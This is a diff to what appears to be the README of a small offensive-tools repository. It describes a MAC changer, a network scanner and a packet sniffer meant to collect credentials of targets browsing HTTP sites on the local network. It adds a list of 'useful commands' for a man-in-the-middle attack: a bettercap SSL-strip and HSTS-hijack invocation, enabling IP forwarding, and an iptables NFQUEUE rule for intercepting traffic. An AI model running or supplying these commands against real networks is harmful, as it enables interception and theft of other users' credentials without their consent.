@@ -8,4 +8,14 @@ mac changer changes your mac address to desired mac
 
 network scanner lists the current ip and mac of all devices on your current network
 
-oacket sniffer collects potential credentials of target who visit http websites on your current network
+packet sniffer collects potential credentials of target who visit http websites on your current network
+
+useful commmands
+  ssl_strip
+  bettercap -iface eth0 -caplet hstshijack/hstshijack
+  
+  -fowarding 
+  echo 1 > /proc/sys/net/ipv4/ip_forward
+
+  -table creation
+  iptables -I FORWARD -j NFQUEUE --queue-num 0
